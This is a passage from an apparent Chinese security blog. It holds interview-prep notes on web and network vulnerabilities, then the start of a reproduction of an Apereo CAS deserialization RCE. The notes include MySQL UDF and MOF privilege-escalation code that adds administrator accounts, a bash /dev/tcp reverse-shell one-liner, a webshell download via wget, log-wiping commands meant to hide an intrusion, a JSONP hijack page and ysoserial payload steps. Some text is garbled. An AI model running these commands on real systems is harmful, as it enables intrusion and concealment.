<p>另外也可以结合着其它业务来描述token的安全性及设计不好怎么被绕过⽐如抢红包业务之类的 </p>
<h4 id="⼗二、SSRF"><a href="#⼗二、SSRF" class="headerlink" title="⼗二、SSRF"></a>⼗二、SSRF</h4><p>SSRF(Server-Side Request Forgery: 服务器端请求伪造) 是⼀种由攻击者构造形成由服务端发起请求的⼀个安全漏洞。 </p>
<p>⼀般情况下，SSRF 攻击的⽬标是从外⽹⽆法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它 </p>
<p>相连⽽与外⽹隔离的内部系统） </p>
<p>SSRF 形成的原因⼤都是由于服务端提供了从其他服务器应⽤获取数据的功能且没有对⽬标地址做过滤与限制。⽐如从指 </p>
<p>定 URL 地址获取⽹⻚⽂本内容，加载指定地址的图⽚，下载等等。 </p>
<p>1、监测SSRF 漏洞的验证⽅法： </p>
<p>1）因为 SSRF 漏洞是让服务器发送请求的安全漏洞，所以我们就可以通过抓包分析发送的请求是否是由服务器的发送 </p>
<p>的，从⽽来判断是否存在 SSRF 漏洞 </p>
<p>2）在⻚⾯源码中查找访问的资源地址 ，如果该资源地址类型为 <a target="_blank" rel="noopener" href="http://www.baidu.com/xxx.php?image=（地址）的就可能存">www.baidu.com/xxx.php?image=（地址）的就可能存</a> 在 SSRF 漏洞 </p>
<p>2、SSRF 漏洞的成因 防御 绕过 </p>
<p>成因：模拟服务器对其他服务器资源进⾏请求，没有做合法性验证。利⽤：构造恶意内⽹ IP 做探测，或者使⽤其余所⽀ </p>
<p>持的协议对其余服务进⾏攻击。防御：禁⽌跳转，限制协议，内外⽹限制，URL 限制。绕过：使⽤不同协议，针对 IP， </p>
<p>IP 格式的绕过，针对 URL，恶意 URL 增添其他字符，@之类的。301 跳转 + dns rebindding。 </p>
<h4 id="⼗三、上传"><a href="#⼗三、上传" class="headerlink" title="⼗三、上传"></a>⼗三、上传</h4><h5 id="1、⽂件上传漏洞原理"><a href="#1、⽂件上传漏洞原理" class="headerlink" title="1、⽂件上传漏洞原理"></a>1、⽂件上传漏洞原理</h5><p>由于程序员在对⽤户⽂件上传部分的控制不⾜或者处理缺陷，⽽导致⽤户可以越过其本身权限向服务器上传可执⾏的动 </p>
<p>态脚本⽂件 </p>
<h5 id="2、常⻅的上传绕过⽅式"><a href="#2、常⻅的上传绕过⽅式" class="headerlink" title="2、常⻅的上传绕过⽅式"></a>2、常⻅的上传绕过⽅式</h5><p>前端 js 验证：禁⽤ js/burp 改包 </p>
<p>⼤⼩写 </p>
<p>双重后缀名 </p>
<p>过滤绕过 pphphp-&gt;php </p>
<h5 id="3、防护⽂件上传⽬录设置为不可执⾏"><a href="#3、防护⽂件上传⽬录设置为不可执⾏" class="headerlink" title="3、防护⽂件上传⽬录设置为不可执⾏"></a>3、防护⽂件上传⽬录设置为不可执⾏</h5><p>使⽤⽩名单判断⽂件上传类型 </p>
<p>⽤随机数改写⽂件名和路径 </p>
<h5 id="4、审查上传点的元素有什么意义？"><a href="#4、审查上传点的元素有什么意义？" class="headerlink" title="4、审查上传点的元素有什么意义？"></a>4、审查上传点的元素有什么意义？</h5><p>有些站点的上传⽂件类型的限制是在前端实现的，这时只要增加上传类型就能突破限制了。 </p>
<h4 id="⼗四、⽂件包含"><a href="#⼗四、⽂件包含" class="headerlink" title="⼗四、⽂件包含"></a>⼗四、⽂件包含</h4><h5 id="1、原理"><a href="#1、原理" class="headerlink" title="1、原理"></a>1、原理</h5><p>引⼊⼀段⽤户能控制的脚本或代码，并让服务器端执⾏ include() 等函数通过动态变量的⽅式引⼊需要包含的⽂件； </p>
<p>⽤户能够控制该动态变量。 </p>
<h5 id="2、导致⽂件包含的函数"><a href="#2、导致⽂件包含的函数" class="headerlink" title="2、导致⽂件包含的函数"></a>2、导致⽂件包含的函数</h5><p>PHP：include(), include_once(), require(), re-quire_once(), fopen(), readfifile(), … JSP/Servlet：ava.io.File(), </p>
<p>java.io.Fil-eReader(), … ASP：include fifile, include virtual, </p>
<h5 id="3、本地⽂件包含"><a href="#3、本地⽂件包含" class="headerlink" title="3、本地⽂件包含"></a>3、本地⽂件包含</h5><p>能够打开并包含本地⽂件的漏洞，被称为本地⽂件包含漏洞 </p>
<h4 id="⼗五、逻辑漏扫"><a href="#⼗五、逻辑漏扫" class="headerlink" title="⼗五、逻辑漏扫"></a>⼗五、逻辑漏扫</h4><h5 id="1、⾦融⾏业常⻅逻辑漏洞"><a href="#1、⾦融⾏业常⻅逻辑漏洞" class="headerlink" title="1、⾦融⾏业常⻅逻辑漏洞"></a>1、⾦融⾏业常⻅逻辑漏洞</h5><p>单针对⾦融业务的 主要是数据的篡改 (涉及⾦融数据，或部分业务的判断数据)，由竞争条件或者设计不当引起的薅⽺ </p>
<p>⽑，交易 / 订单信息泄露，⽔平越权对别⼈的账户查看或恶意操作，交易或业务步骤绕过。 </p>
<h4 id="⼗五、中间⼈攻击"><a href="#⼗五、中间⼈攻击" class="headerlink" title="⼗五、中间⼈攻击"></a>⼗五、中间⼈攻击</h4><p>中间 攻 （缺 ） 的攻 客户 与 务 之间在 的 中缺 造成的中间⼈攻击是⼀个（缺乏）相互认证的攻击；由于客户端与服务器之间在 SSL 握⼿的过程中缺乏相互认证⽽造成的漏洞 </p>
<p>防御中间⼈攻击的⽅案通常基于⼀下⼏种技术 </p>
<ol>
<li>公钥基础建设 PKI 使⽤ PKI 相互认证机制，客户端验证服务器，服务器验证客户端；上述两个例⼦中都是只验证服务 </li>
</ol>
<p>器，这样就造成了 SSL 握⼿环节的漏洞，⽽如果使⽤相互认证的的话，基本可以更强⼒的相互认证</p>
<ol start="2">
<li>延迟测试 </li>
</ol>
<p>使⽤复杂加密哈希函数进⾏计算以造成数⼗秒的延迟；如果双⽅通常情况下都要花费 20 秒来计算，并且整个通讯花费 </p>
<p>了 60 秒计算才到达对⽅，这就能表明存在第三⽅中间⼈。 </p>
<ol start="3">
<li>使⽤其他形式的密钥交换形式</li>
</ol>
<h5 id="ARP-欺骗"><a href="#ARP-欺骗" class="headerlink" title="ARP 欺骗"></a>ARP 欺骗</h5><p>原理</p>
<p>每台主机都有⼀个 ARP 缓存表，缓存表中记录了 IP 地址与 MAC 地址的对应关系，⽽局域⽹数据传输依靠的是 MAC</p>
<p>地址。在 ARP 缓存表机制存在⼀个缺陷，就是当请求主机收到 ARP 应答包后，不会去验证⾃⼰是否向对⽅主机发送过</p>
<p>ARP 请求包，就直接把这个返回包中的 IP 地址与 MAC 地址的对应关系保存进 ARP 缓存表中，如果原有相同 IP 对应关 </p>
<p>系，原有的则会被替换。这样攻击者就有了偷听主机传输的数据的可能 </p>
<p>防护</p>
<ol>
<li><p>在主机绑定⽹关 MAC 与 IP 地址为静态（默认为动态），命令：arp -s ⽹关 IP ⽹关 MAC </p>
</li>
<li><p>在⽹关绑定主机 MAC 与 IP 地址</p>
</li>
<li><p>使⽤ ARP 防⽕墙 </p>
</li>
</ol>
<h4 id="⼗六、DDOS1、DDOS-原理"><a href="#⼗六、DDOS1、DDOS-原理" class="headerlink" title="⼗六、DDOS1、DDOS 原理"></a>⼗六、DDOS1、DDOS 原理</h4><p>利⽤合理的请求造成资源过载，导致服务不可⽤ </p>
<h5 id="syn-洪流的原理"><a href="#syn-洪流的原理" class="headerlink" title="syn 洪流的原理"></a>syn 洪流的原理</h5><p>伪造⼤量的源 IP 地址，分别向服务器端发送⼤量的 SYN 包，此时服务器端会返回 SYN/ACK 包，因为源地址是伪造 </p>
<p>的，所以伪造的 IP 并不会应答，服务器端没有收到伪造 IP 的回应，会重试 3～5 次并且等待⼀个 SYNTime（⼀般为 </p>
<p>30 秒⾄ 2 分钟），如果超时则丢弃这个连接。攻击者⼤量发送这种伪造源地址的 SYN 请求，服务器端将会消耗⾮常多 </p>
<p>的资源（CPU 和内存）来处理这种半连接，同时还要不断地对这些 IP 进⾏ SYN+ACK 重试。最后的结果是服务器⽆暇 </p>
<p>理睬正常的连接请求，导致拒绝服务。 </p>
<h5 id="CC-攻击原理"><a href="#CC-攻击原理" class="headerlink" title="CC 攻击原理"></a>CC 攻击原理</h5><p>对⼀些消耗资源较⼤的应⽤⻚⾯不断发起正常的请求，以达到消耗服务端资源的⽬的。 </p>
<p>2、DOSS 防护 </p>
<p>SYN Cookie/SYN Proxy、safereset 等算法。SYN Cookie 的主要思想是为每⼀个 IP 地址分配⼀个 “Cookie”，并统计每 </p>
<p>个 IP 地址的访问频率。如果在短时间内收到⼤量的来⾃同⼀个 IP 地址的数据包，则认为受到攻击，之后来⾃这个 IP 地 </p>
<p>址的包将被丢弃。 </p>
<h4 id="⼗七、提权"><a href="#⼗七、提权" class="headerlink" title="⼗七、提权"></a>⼗七、提权</h4><p>MySQL 两种提权⽅式 </p>
<p>udf 提权, mof 提权 </p>
<p>MySQL_UDF 提取 </p>
<p>要求: 1. ⽬标系统是 Windows(Win2000,XP,Win2003)；2. 拥有 MYSQL 的某个⽤户账号，此账号必须有对 mysql 的 </p>
<p>insert 和 delete 权限以创建和抛弃函数 3. 有 root 账号密码 导出 udf: MYSQL 5.1 以上版本，必须要把 udf.dll ⽂件放到 </p>
<p>安装⽬录 的 \ ⽂件夹 才能创建⾃定义函数 以再 ⾥输⼊MYSQL 安装⽬录下的 lib\plugin ⽂件夹下才能创建⾃定义函数 可以再 mysql ⾥输⼊ select @@basedir show variables</p>
<p>like ‘%plugins%’ 寻找 mysql 安装路径 提权: </p>
<p>使⽤ SQL 语句创建功能函数。语法：Create Function 函数名（函数名只能为下⾯列表中的其中之⼀）returns string </p>
<p>soname ‘导出的 DLL 路径’；</p>
<p>create function cmdshell returns string soname ‘udf.dll’</p>
<p>select cmdshell(‘net user arsch arsch /add’);</p>
<p>select cmdshell(‘net localgroup administrators arsch /add’);</p>
<p>drop function cmdshell;</p>
<p>该⽬录默认是不存在的，这就需要我们使⽤ webshell 找到 MYSQL 的安装⽬录，并在安装⽬录下创建 lib\plugin ⽂件 </p>
<p>夹，然后将 udf.dll ⽂件导出到该⽬录即可。 </p>
<p>MySQL mof 提权</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;)</span><br><span class="line"></span><br><span class="line">instance of __EventFilter as $EventFilter</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">EventNamespace &#x3D; &quot;Root\\Cimv2&quot;;</span><br><span class="line"></span><br><span class="line">Name &#x3D; &quot;filtP2&quot;;</span><br><span class="line"></span><br><span class="line">Query &#x3D; &quot;Select * From __InstanceModificationEvent &quot;</span><br><span class="line"></span><br><span class="line">&quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;</span><br><span class="line"></span><br><span class="line">&quot;And TargetInstance.Second &#x3D; 5&quot;;</span><br><span class="line"></span><br><span class="line">QueryLanguage &#x3D; &quot;WQL&quot;;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">Name &#x3D; &quot;consPCSV2&quot;;</span><br><span class="line"></span><br><span class="line">ScriptingEngine &#x3D; &quot;JScript&quot;;</span><br><span class="line"></span><br><span class="line">ScriptText &#x3D;</span><br><span class="line"></span><br><span class="line">&quot;var WSH &#x3D; new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user waitalone waitalone.cn &#x2F;add\&quot;)&quot;;</span><br><span class="line"></span><br><span class="line">&#125;;instance of __FilterToConsumerBinding</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">Consumer &#x3D; $Consumer;</span><br><span class="line"></span><br><span class="line">Filter &#x3D; $EventFilter;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>其中的第 18 ⾏的命令，上传前请⾃⼰更改。 </p>
<p>2、执⾏ load_fifile 及 into dumpfifile 把⽂件导出到正确的位置即可。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load file(&#39;c:&#x2F;wmpub&#x2F;nullevt.mof&#39;) into dumpfile &#39;c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;nullevt.mov&#39;</span><br></pre></td></tr></table></figure>

<p>执⾏成功后，即可添加⼀个普通⽤户，然后你可以更改命令，再上传导出执⾏把⽤户提升到管理员权限，然后 3389 连 </p>
<p>接之就 ok 了。 </p>
<h4 id="⼗⼋、特殊漏洞"><a href="#⼗⼋、特殊漏洞" class="headerlink" title="⼗⼋、特殊漏洞"></a>⼗⼋、特殊漏洞</h4><p>1、Struts2-045 </p>
<p>2、Redis 未授权 </p>
<p>产⽣原因 </p>
<p>Redis 默认情况下，会绑定在 0.0.0.0:6379，这样将会将 Redis 服务暴露到公⽹上，如果在没有开启认证的情况下，可 </p>
<p>以导致任意⽤户在可以访问⽬标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis </p>
<p>的情况下可以利⽤ Redis 的相关⽅法，可以成功在 Redis 服务器上写⼊公钥，进⽽可以使⽤对应私钥直接登录⽬标服务 </p>
<p>器</p>
<p>利⽤条件和⽅法 </p>
<p>条件: </p>
<p>a、redis 服务以 root 账户运⾏ </p>
<p>b、redis ⽆密码或弱密码进⾏认证c、redis 监听在 0.0.0.0 公⽹上 </p>
<p>⽅法: </p>
<p>a、通过 Redis 的 INFO 命令, 可以查看服务器相关的参数和敏感信息, 为攻击者的后续渗透做铺垫 </p>
<p>b、上传 SSH 公钥获得 SSH 登录权限 </p>
<p>c、通过 crontab 反弹 shell </p>
<p>d、slave 主从模式利⽤ </p>
<p>修复</p>
<p>密码验证 </p>
<p>降权运⾏ </p>
<p>限制 ip / 修改端⼝ </p>
<p>3、Jenkins 未授权访问 </p>
<p>4、MongoDB 未授权访问 </p>
<p>攻击者通过未授权访问进⼊脚本命令执⾏界⾯执⾏攻击指令</p>
<p>println “ifconfig -a”.execute().text 执⾏⼀些系统命令, 利⽤ wget 下载 webshell </p>
<p>开启 MongoDB 服务时不添加任何参数时, 默认是没有权限验证的, ⽽且可以远程访问数据库，登录的⽤户可以通过默认 </p>
<p>端⼝⽆需密码对数据库进⾏增、删、改、查等任意⾼危操作。 </p>
<p>防护</p>
<p>为 MongoDB 添加认证：1)MongoDB 启动时添加–auth 参数 2) 给 MongoDB 添加⽤户：use admin #使⽤ admin 库 </p>
<p>db.addUser(“root”, “123456”) #添加⽤户名 root 密码 123456 的⽤户 db.auth(“root”,“123456”) #验证下是否添加成 </p>
<p>功，返回 1 说明成功 2、禁⽤ HTTP 和 REST 端⼝ MongoDB ⾃身带有⼀个 HTTP 服务和并⽀持 REST 接⼝。在 2.6 </p>
<p>以后这些接⼝默认是关闭的。mongoDB 默认会使⽤默认端⼝监听 web 服务，⼀般不需要通过 web ⽅式进⾏远程管理，建议禁⽤。修改配置⽂件或在启动的时候选择–nohttpinterface 参数 nohttpinterface=false 3、限制绑定 IP 启动时加⼊</p>
<p>参数 –bind_ip 127.0.0.1 或在 / etc/mongodb.conf ⽂件中添加以下内容：bind_ip = 127.0.0.1 </p>
<p>5、Memcache 未授权访问 </p>
<p>Memcached 是⼀套常⽤的 key-value 缓存系统，由于它本身没有权限控制模块，所以对公⽹开放的 Memcache 服务很 </p>
<p>容易被攻击者扫描发现，攻击者通过命令交互可直接读取 Memcached 中的敏感信息。 </p>
<p>利⽤</p>
<p>a、登录机器执⾏ netstat -an |more 命令查看端⼝监听情况。回显 0.0.0.0:11211 表示在所有⽹卡进⾏监听，存在 </p>
<p>memcached 未授权访问漏洞。 </p>
<p>b、telnet 11211，或 nc -vv 11211，提示连接成功表示漏洞存在 </p>
<p>漏洞加固 </p>
<p>a、设置 memchached 只允许本地访问 b、禁⽌外⽹访问 Memcached 11211 端⼝ c、编译时加上–enable-sasl，启⽤ </p>
<p>SASL 认证</p>
<p>6、FFMPEG 本地⽂件读取 </p>
<p>原理</p>
<p>通过调⽤加密 API 将 payload 加密放⼊⼀个会被执⾏的段字节中。但是具体回答⼯程中我只回答道了 SSRF ⽼洞， </p>
<p>m3u8 头，偏移量，加密。 </p>
<h4 id="⼗九、安全知识"><a href="#⼗九、安全知识" class="headerlink" title="⼗九、安全知识"></a>⼗九、安全知识</h4><p>1、WEB </p>
<p>常⻅ WEB 开发 JAVA 框架</p>
<p>STRUTS,SPRING 常⻅的 java 框架漏洞 其实⾯试官问这个问题的时候我不太清楚他要问什么，我提到 struts 的 045048，java 常⻅反序列化。045 错误处理引⼊了 ognl 表达式 048 封装 action 的过程中有⼀步调⽤ getstackvalue 递归 </p>
<p>获取 ognl 表达式 反序列化 操作对象，通过⼿段引⼊。apache common 的反射机制、readobject 的重写，其实具体的 </p>
<p>我也记不清楚。。。然后这部分就结束了 </p>
<p>同源策略 </p>
<p>同源策略限制不同源对当前 document 的属性内容进⾏读取或设置。不同源的区分：协议、域名、⼦域名、IP、端⼝， </p>
<p>以上有不同时即不同源。 </p>
<p>Jsonp 安全攻防技术，怎么写 Jsonp 的攻击⻚⾯</p>
<p>涉及到 Jsonp 的安全攻防内容 </p>
<p>JSON 劫持、Callback 可定义、JSONP 内容可定义、Content-type 不为 json。 </p>
<p>攻击⻚⾯</p>
<p>JSON 劫持，跨域劫持敏感信息，⻚⾯类似于</p>
<p>function wooyun(v){</p>
<p>alert(v.username);</p>
<p>}</p>
<p> </p>
<script src="http://js.login.360.cn/?o=sso&m=info&func=wooyun"></script> 

<p>Content-type 不正确情况下，JSONP 和 Callback 内容可定义可造成 XSS。JSONP 和 FLASH 及其他的利⽤参照知道 </p>
<p>创宇的 JSONP 安全攻防技术。 </p>
<p>2、PHP </p>
<p>php 中命令执⾏涉及到的函数 </p>
<p>代码执⾏：eval()、assert()、popen()、system()、exec()、shell_exec()、 </p>
<p>passthru(),pcntl_exec(),call_user_func_array(),create_function()⽂件读取：fifile_get_contents(),highlight_fifile(),fopen(),read fifile(),fread(),fgetss(), </p>
<p>fgets(),parse_ini_fifile(),show_source(),fifile() 等 </p>
<p>命令执⾏：system(), exec(), shell_exec(), passthru() ,pcntl_exec(), popen(),proc_open() </p>
<p>安全模式下绕过 php 的 disable fuction </p>
<p>DL 函数，组件漏洞，环境变量。 </p>
<p>PHP 弱类型</p>
<p>== 在进⾏⽐较的时候，会先将字符串类型转化成相同，再⽐较 </p>
<p>如果⽐较⼀个数字和字符串或者⽐较涉及到数字内容的字符串，则字符串会被转换成数值并且⽐较按照数值来进⾏</p>
<p>0e 开头的字符串等于 0 </p>
<p>3、数据库 </p>
<p>各种数据库⽂件存放的位置 </p>
<p>mysql:</p>
<p>/usr/local/mysql/data/</p>
<p>C:\ProgramData\MySQL\MySQL Server 5.6\Data\</p>
<p>oracle: $ORACLE_BASE/oradata/$ORACLE_SID/</p>
<p>4、系统</p>
<p>如何清理⽇志如何清理⽇志 </p>
<p>meterpreter: clearev</p>
<p>⼊侵 Linux 服务器后需要清除哪些⽇志？ </p>
<p>web ⽇志，如 apache 的 access.log,error.log。直接将⽇志清除过于明显, ⼀般使⽤ sed 进⾏定向清除 </p>
<p>e.g. sed -i -e ‘/192.169.1.1/d’ </p>
<p>history 命令的清除，也是对~/.bash_history 进⾏定向清除 </p>
<p>wtmp ⽇志的清除，/var/log/wtmp </p>
<p>登录⽇志清除 /var/log/secure </p>
<p>LINUX </p>
<p>查看当前端⼝连接的命令有哪些？netstat 和 ss 命令的区别和优缺点</p>
<p>netstat -antp<code></code>ss -l</p>
<p>ss 的优势在于它能够显示更多更详细的有关 TCP 和连接状态的信息，⽽且⽐ netstat 更快速更⾼效。 </p>
<p>反弹 shell 的常⽤命令？⼀般常反弹哪⼀种 shell？为什么?</p>
<p>bash -i&gt;&amp;/dev/tcp/x.x.x.x/4444 0&gt;&amp;1</p>
<p>通过 Linux 系统的 / proc ⽬录 ，能够获取到哪些信息，这些信息可以在安全上有哪些应⽤？</p>
<p>ls /proc</p>
<p>系统信息，硬件信息，内核版本，加载的模块，进程 </p>
<p>linux 系统中，检测哪些配置⽂件的配置项，能够提升 SSH 的安全性。</p>
<p>/etc/ssh/sshd config iptables 配置/etc/ssh/sshd___config iptables 配置 </p>
<p>如何⼀条命令查看⽂件内容最后⼀百⾏</p>
<p>tail -n 100 filename</p>
<p>Windows </p>
<p>如何加固⼀个域环境下的 Windows 桌⾯⼯作环境？请给出你的思路。 </p>
<p>5、密码学 </p>
<p>AES／DES 的具体⼯作步骤 </p>
<p>RSA 算法 </p>
<p>加密: </p>
<p>密⽂＝明⽂ ^EmodN </p>
<p>RSA 加密是对明⽂的 E 次⽅后除以 N 后求余数的过程 </p>
<p>公钥＝(E,N) </p>
<p>解密: </p>
<p>明⽂＝密⽂ ^DmodN 私钥＝(D,N)</p>
<p>三个参数 n,e1,e2 </p>
<p>n 是两个⼤质数 p,q 的积 </p>
<p>分组密码的加密模式 </p>
<p>如何⽣成⼀个安全的随机数？ </p>
<p>引⽤之前⼀个学⻓的答案，可以通过⼀些物理系统⽣成随机数，如电压的波动、磁盘磁头读 / 写时的寻道时间、空中电磁波的噪声等。 </p>
<p>SSL 握⼿过程 </p>
<p>建⽴ TCP 连接、客户端发送 SSL 请求、服务端处理 SSL 请求、客户端发送公共密钥加密过的随机数据、服务端⽤私有 </p>
<p>密钥解密加密后的随机数据并协商暗号、服务端跟客户端利⽤暗号⽣成加密算法跟密钥 key、之后正常通信。这部分本</p>
<p>来是忘了的，但是之前看 SSL Pinning 的时候好像记了张图在脑⼦⾥，挣扎半天还是没敢确定，遂放弃。。。</p>
<p>对称加密与⾮对称加密的不同，分别⽤在哪些⽅⾯ </p>
<p>6、TCP/IP</p>
<p>TCP 三次握⼿的过程以及对应的状态转换 </p>
<p>（1）客户端向服务器端发送⼀个 SYN 包，包含客户端使⽤的端⼝号和初始序列号 x; </p>
<p>（2）服务器端收到客户端发送来的 SYN 包后，向客户端发送⼀个 SYN 和 ACK 都置位的 TCP 报⽂，包含确认号 xx1 </p>
<p>和服务器端的初始序列号 y; </p>
<p>（3）客户端收到服务器端返回的 SYNSACK 报⽂后，向服务器端返回⼀个确认号为 yy1、序号为 xx1 的 ACK 报⽂，⼀</p>
<p>个标准的 TCP 连接完成。 </p>
<p>TCP 和 UDP 协议区别 </p>
<p>tcp ⾯向连接, udp ⾯向报⽂ tcp 对系统资源的要求多 udp 结构简单 tcp 保证数据完整性和顺序，udp 不保证 </p>
<p>https 的建⽴过程 </p>
<p>a、客户端发送请求到服务器端 </p>
<p>b、服务器端返回证书和公开密钥，公开密钥作为证书的⼀部分⽽存在 </p>
<p>c、客户端验证证书和公开密钥的有效性，如果有效，则⽣成共享密钥并使⽤公开密钥加密发送到服务器端 </p>
<p>d、服务器端使⽤私有密钥解密数据，并使⽤收到的共享密钥加密数据，发送到客户端 </p>
<p>e、客户端使⽤共享密钥解密数据</p>
<p>f SSL 加密建⽴f、SSL 加密建⽴ </p>
<p>7、流量分析 </p>
<p>wireshark 简单的过滤规则 </p>
<p>过滤 ip: </p>
<p>过滤源 ip 地址: ip.src==1.1.1.1; , ⽬的 ip 地址: ip.dst==1.1.1.1;</p>
<p>过滤端⼝: </p>
<p>过滤 80 端⼝: tcp.port==80 , 源端⼝: tcp.srcport==80 , ⽬的端⼝: tcp.dstport==80</p>
<p>协议过滤: </p>
<p>直接输⼊协议名即可, 如 http 协议 http</p>
<p>http 模式过滤: </p>
<p>过滤 get/post 包 http.request.mothod==”GET/POST”</p>
<p>8、防⽕墙 </p>
<p>简述路由器交换机、防⽕墙等⽹络设备常⽤的⼏个基础配置加固项，以及配置⽅法。</p>
<p>转自：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/Mr-xn/BurpSuite-collections">https://github.com/Mr-xn/BurpSuite-collections</a></p>
</div><hr style="height:1px;margin:1rem 0"><div class="level is-mobile is-flex"><div class="article-tags is-size-7 is-uppercase"><i class="fas fa-tags has-text-grey"></i> <a class="link-muted" rel="tag" href="/tags/%E9%9D%A2%E8%AF%95/">面试 </a></div></div></article></div><div class="card"><article class="card-content article" role="article"><h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal"><a class="has-link-black-ter" href="/2020/12/29/WEB/Exploit/Apereo-cas/Apereo-Cas-4-1-x-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"><i class="fas fa-angle-double-right"></i>Apereo Cas 4.1.x 反序列化命令执行漏洞</a></h1><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><i class="far fa-calendar-alt"> </i><time dateTime="${date_xml(page.date)}" title="${date_xml(page.date)}">2020-12-29</time></span><span class="level-item">Updated&nbsp;<time dateTime="2020-12-30T03:19:03.360Z" title="2020-12-30T03:19:03.360Z">2020-12-30</time></span><span class="level-item is-hidden-mobile"><i class="far fa-calendar-check"> </i><time dateTime="${date_xml(page.updated)}" title="${date_xml(page.updated)}">2020-12-30</time></span><span class="level-item"><a class="link-muted" href="/categories/WEB%E5%AE%89%E5%85%A8/">WEB安全</a></span><span class="level-item">6 minutes read (About 943 words)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/12/29/WEB/Exploit/Apereo-cas/Apereo-Cas-4-1-x-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">Apereo Cas 4.1.x 反序列化命令执行漏洞</a></h1><div class="content"><h2 id="概要"><a href="#概要" class="headerlink" title="概要"></a>概要</h2><blockquote>
<p>Apereo CAS 是一款 Apereo 发布的集中认证服务平台，常被用于企业内部单点登录系统。其 4.1.7 版本之前存在一处默认密钥的问题，利用这个默认密钥我们可以构造恶意信息触发目标反序列化漏洞，进而执行任意命令。</p>
</blockquote>
<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>其实这个洞在2016年时候就出来了，Apereo Cas一般是用来做身份认证的，所以有一定的攻击面，漏洞的成因是因为key的默认硬编码，导致可以通过反序列化配合Gadget使用。</p>
<p>漏洞原理实际上是 Webflow 中使用了默认密钥 <code>changeit</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public class EncryptedTranscoder implements Transcoder &#123;</span><br><span class="line">    private CipherBean cipherBean;</span><br><span class="line">    private boolean compression &#x3D; true;</span><br><span class="line"></span><br><span class="line">    public EncryptedTranscoder() throws IOException &#123;</span><br><span class="line">        BufferedBlockCipherBean bufferedBlockCipherBean &#x3D; new BufferedBlockCipherBean();</span><br><span class="line">        bufferedBlockCipherBean.setBlockCipherSpec(new BufferedBlockCipherSpec(&quot;AES&quot;, &quot;CBC&quot;, &quot;PKCS7&quot;));</span><br><span class="line">        bufferedBlockCipherBean.setKeyStore(this.createAndPrepareKeyStore());</span><br><span class="line">        bufferedBlockCipherBean.setKeyAlias(&quot;aes128&quot;);</span><br><span class="line">        bufferedBlockCipherBean.setKeyPassword(&quot;changeit&quot;);</span><br><span class="line">        bufferedBlockCipherBean.setNonce(new RBGNonce());</span><br><span class="line">        this.setCipherBean(bufferedBlockCipherBean);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>工具下载地址：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/MrMeizhi/ysoserial-mangguogan">https://github.com/MrMeizhi/ysoserial-mangguogan</a></p>
<p>命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-managguogan-0.0.1-SNAPSHOT-all.jar encode CommonCollections4</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201229195402286.png" alt="image-20201229195402286"></p>
<p>将该payload替换至execution处，并在头部添加命令cmd:xxx</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201229203354148.png" alt="image-20201229203354148"></p>
